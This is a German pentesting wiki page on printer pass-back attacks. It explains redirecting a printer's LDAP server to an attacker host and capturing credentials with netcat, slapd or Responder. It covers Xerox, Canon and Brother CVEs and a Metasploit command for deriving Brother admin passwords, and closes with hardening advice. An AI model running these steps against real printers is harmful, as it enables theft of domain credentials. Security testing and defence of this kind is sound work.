# Informationen in Druckern

{{#include ../../banners/hacktricks-training.md}}

Im Internet gibt es mehrere Blogs, die **auf die Gefahren hinweisen, wenn Drucker mit LDAP und standardmäßigen/schwachen** Anmeldedaten konfiguriert bleiben.  \
Der Grund dafür ist, dass ein Angreifer **den Drucker dazu bringen könnte, sich bei einem betrügerischen LDAP-Server zu authentifizieren** (in der Regel reicht ein `nc -vv -l -p 389` oder `slapd -d 2` aus) und die **Anmeldedaten des Druckers im Klartext** abfangen könnte.

Außerdem enthalten viele Drucker **Protokolle mit Benutzernamen** oder können sogar **alle Benutzernamen** vom Domain Controller **herunterladen**.

All diese **sensiblen Informationen** und der verbreitete **Mangel an Sicherheit** machen Drucker für Angreifer besonders interessant.

Einige einführende Blogs zu diesem Thema:

- [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)<sup>[[4]](#references)</sup>
- [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)<sup>[[5]](#references)</sup>

---

## Druckerkonfiguration

- **Ort**: Die LDAP-Serverliste befindet sich normalerweise in der Weboberfläche (z. B. *Netzwerk ➜ LDAP-Einstellung ➜ LDAP einrichten*).
- **Verhalten**: Viele eingebettete Webserver ermöglichen Änderungen am LDAP-Server, **ohne die Anmeldedaten erneut eingeben zu müssen** (Benutzerfreundlichkeit → Sicherheitsrisiko).
- **Exploit**: Leite die LDAP-Serveradresse zu einem vom Angreifer kontrollierten Host um und verwende die Schaltfläche *Verbindung testen* / *Adressbuch synchronisieren*, um den Drucker dazu zu bringen, einen bind mit dir durchzuführen.

---

## Anmeldedaten abfangen

### Methode 1 – Netcat Listener

```bash
sudo nc -k -v -l -p 389     # Plain LDAP only
```

Kleine/ältere MFPs senden möglicherweise einen einfachen *simple-bind*, bei dem Bind-DN und Passwort im rohen BER-Datenstrom sichtbar sind. Moderne Geräte führen üblicherweise zuerst eine anonyme Abfrage aus und versuchen anschließend den Bind, daher variieren die Ergebnisse.<sup>[[1]](#references)</sup>

Ein einfacher `nc`-Listener auf 636/3269 empfängt nur TLS-Chiffretext; zum Testen von LDAPS ist ein TLS-fähiger LDAP-Endpunkt erforderlich, und eine Umleitung sollte fehlschlagen, wenn das Gerät das Serverzertifikat korrekt überprüft.

### Methode 2 – Vollständiger Rogue-LDAP-Server (empfohlen)

Da viele Geräte vor der Authentifizierung eine anonyme Suche ausführen, liefert der Betrieb eines echten LDAP-Daemons wesentlich zuverlässigere Ergebnisse:<sup>[[1]](#references)</sup>

```bash
# Debian/Ubuntu example
sudo apt install slapd ldap-utils
sudo dpkg-reconfigure slapd   # set any base-DN – it will not be validated

# run slapd in foreground / debug 2
slapd -d 2 -h "ldap:///"      # only LDAP, no LDAPS
```

Wenn der Drucker die Abfrage durchführt, werden die Klartext-Anmeldedaten in der Debug-Ausgabe angezeigt.

> 💡  Responder umfasst Rogue-LDAP- und SMB-Authentifizierungsdienste. Ein einfacher LDAP-Bind kann das konfigurierte Passwort offenlegen, während bei der NTLM-Authentifizierung Challenge-Response-Material erzeugt wird; beschreibe nicht beide Ergebnisse als Klartextpasswort.

---

## Aktuelle Pass-Back-Schwachstellen (2024–2025)

Pass-Back ist *kein* theoretisches Problem – Anbieter veröffentlichen auch 2024/2025 weiterhin Hinweise, die genau diese Angriffsklasse beschreiben.

### Xerox VersaLink – CVE-2024-12510 & CVE-2024-12511

Firmware ≤ 57.69.91 von Xerox VersaLink C70xx MFPs ermöglichte es einem authentifizierten Admin (oder jedem, wenn die Standard-Anmeldedaten nicht geändert wurden):

* **CVE-2024-12510 – LDAP pass-back**: die LDAP-Serveradresse zu ändern und eine Abfrage auszulösen, wodurch das Gerät die konfigurierten Windows-Anmeldedaten an den vom Angreifer kontrollierten Host weitergab.
* **CVE-2024-12511 – SMB/FTP pass-back**: identisches Problem über *scan-to-folder*-Ziele, wobei NetNTLMv2- oder FTP-Klartext-Anmeldedaten offengelegt wurden.<sup>[[2]](#references)</sup>

Ein einfacher Listener wie:

```bash
sudo nc -k -v -l -p 389     # capture LDAP bind
```

oder ein rogue SMB server (`impacket-smbserver`) reicht aus, um die Zugangsdaten abzugreifen.  

### Canon imageRUNNER / imageCLASS – Sicherheitshinweis vom 20. Mai 2025

Canon bestätigte eine **SMTP/LDAP-Pass-back**-Schwachstelle in Dutzenden Produktreihen von Laser- und MFP-Geräten. Ein Angreifer mit Admin-Zugriff kann die Serverkonfiguration ändern und die gespeicherten Zugangsdaten für LDAP **oder** SMTP abrufen (viele Organisationen verwenden ein privilegiertes Konto für Scan-to-Mail).<sup>[[3]](#references)</sup>

Der Hersteller empfiehlt ausdrücklich:

1. Sobald verfügbar, auf gepatchte Firmware aktualisieren.
2. Starke, einzigartige Admin-Passwörter verwenden.
3. Privilegierte AD-Konten nicht für die Druckerintegration verwenden.

---

### Brother-Geräte und OEM-Varianten – serialnummernbasierter Admin-Zugriff auf Service-Zugangsdaten

Eine koordinierte Offenlegung im Jahr 2025 demonstrierte eine besonders nützliche Angriffskette bei betroffenen Brother-Geräten; Teile der Schwachstellen betreffen auch OEM-Modelle. Überprüfen Sie daher das genaue Modell anhand des Sicherheitshinweises des Herstellers. Ein nicht authentifizierter Angreifer kann bei anfälliger Firmware die Seriennummer des Geräts über HTTP/HTTPS/IPP abrufen. Seriennummern können auch über Verwaltungsprotokolle wie SNMP oder PJL verfügbar sein. Wurde das werkseitige Passwort nie geändert, lässt sich das Administratorpasswort deterministisch aus der Seriennummer ableiten. Nach der Authentifizierung legt die separate Pass-back-Schwachstelle CVE-2024-51984 konfigurierte Passwörter für externe Dienste wie LDAP oder FTP im Klartext offen. So wird aus dem Zugriff auf die Druckerverwaltung der Zugriff auf wiederverwendbare Netzwerkzugangsdaten. Die Firmware behebt die Offenlegung der Dienstpasswörter, doch bei bereits hergestellten Geräten muss der Betreiber weiterhin das aus der Seriennummer abgeleitete anfängliche Administratorpasswort ersetzen.<sup>[[6]](#references)</sup>

Die aktuelle Version von Metasploit enthält ein Auxiliary-Modul, das die Seriennummer über HTTP, SNMP oder PJL ermittelt, das mögliche anfängliche Passwort generiert und es optional an der Webkonsole überprüft. `DiscoverSerialVia=AUTO` probiert die unterstützten Ermittlungsmethoden aus. Geben Sie stattdessen `TargetSerial` an, wenn die Seriennummer bereits im Anlagenverzeichnis enthalten ist.<sup>[[7]](#references)</sup>

```text
msfconsole -q
use auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978
set RHOSTS <printer-ip>
set DiscoverSerialVia AUTO
run
```

Verwende das Ergebnis ausschließlich zur Validierung autorisierter Assets. Ob das Passwort funktioniert, hängt vom genauen Modell ab und vor allem davon, ob das werkseitige Administratorkennwort bereits geändert wurde.<sup>[[6]](#references)[[7]](#references)</sup>

---

## Automatisierte Enumerierungs- / Exploitation-Tools

| Tool | Zweck | Beispiel |
|------|---------|---------|
| **PRET** (Printer Exploitation Toolkit) | Missbrauch von PostScript/PJL/PCL, Dateisystemzugriff, Prüfung auf Standardanmeldedaten, *SNMP-Erkennung* | `python pret.py 192.168.1.50 pjl` |
| **Praeda** | Konfiguration (einschließlich Adressbüchern und LDAP-Anmeldedaten) über HTTP/HTTPS auslesen | `perl praeda.pl -t 192.168.1.50` |
| **Responder / ntlmrelayx** | Nicht vertrauenswürdige Authentifizierungsdienste starten und NetNTLM von SMB-Callbacks erfassen/weiterleiten | `sudo responder -I eth0 -v` |
| **Metasploit Brother auxiliary** | Seriennummer ermitteln, daraus ein mögliches werkseitiges Administratorkennwort ableiten und den Zugriff auf die Webkonsole überprüfen | `use auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978` |

---

## Härtung & Erkennung

1. **MFPs zeitnah patchen / Firmware aktualisieren** (Sicherheitsbulletins des Herstellers beachten).
2. **Werkseitige Administratorkennwörter ersetzen** – ein Firmware-Update entfernt nicht automatisch seriennummernbasierte Erstkennwörter von zuvor hergestellten betroffenen Brother-/OEM-Geräten.<sup>[[6]](#references)</sup>
3. **Dienstkonten mit geringsten Berechtigungen** – niemals Domain Admin für LDAP/SMB/SMTP verwenden; auf *schreibgeschützte* OU-Bereiche beschränken.
4. **Verwaltungszugriff einschränken** – Web-/IPP-/SNMP-Schnittstellen von Druckern in einem Verwaltungs-VLAN oder hinter einer ACL/VPN platzieren.
5. **Ausgehenden Datenverkehr von Druckern begrenzen** – jedem Gerät nur erlauben, die erwarteten DC-/LDAP-, Mail-, DNS-/NTP-, Druck- und Scan-Dateiziele zu kontaktieren. Für Pass-back ist ein Callback an einen vom Angreifer ausgewählten Endpunkt erforderlich.
6. **Nicht verwendete Protokolle deaktivieren** – FTP, Telnet, Raw-Port 9100 und ältere SSL-Chiffren.
7. **Audit-Logging aktivieren** – manche Geräte können LDAP-/SMTP-Fehler per Syslog protokollieren; unerwartete Bind-Vorgänge korrelieren.
8. **Authentifizierungsziele überwachen** – Alarm auslösen, wenn ein Drucker LDAP, SMB, SMTP oder FTP zu einem Host außerhalb seiner Zulassungsliste initiiert, insbesondere unmittelbar nach einer Verwaltungsanmeldung oder Konfigurationsänderung.
9. **SNMPv3 verwenden oder SNMP deaktivieren** – die Community `public` gibt oft Geräte- und Seriennummerninformationen preis.

---



---

## References

- [1] [Es ist nur ein Drucker … Was könnte schon passieren?](https://grimhacker.com/2018/03/09/just-a-printer/)
- [2] [Xerox Versalink C7025 Multifunktionsdrucker: Pass-Back-Angriffs-Schwachstellen (behoben)](https://www.rapid7.com/blog/post/2025/02/14/xerox-versalink-c7025-multifunction-printer-pass-back-attack-vulnerabilities-fixed/)
- [3] [CP2025-004: Behebung/Minderung von Schwachstellen bei Produktionsdruckern, Multifunktionsdruckern für Büro und Kleinbüro sowie Laserdruckern](https://psirt.canon/advisory-information/cp2025-004/)
- [4] [Domain-Anmeldedaten über einen Drucker mit Netcat erlangen](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
- [5] [Multifunktionsdrucker während eines Penetrationstests ausnutzen](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [6] [Mehrere Brother-Geräte: Mehrere Schwachstellen (BEHOBEN)](https://www.rapid7.com/blog/post/multiple-brother-devices-multiple-vulnerabilities-fixed/)
- [7] [Metasploit: Modul zur Umgehung der Standard-Administratorkennwort-Authentifizierung bei Brother-Geräten](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/misc/brother_default_admin_auth_bypass_cve_2024_51978.rb)
{{#include ../../banners/hacktricks-training.md}}
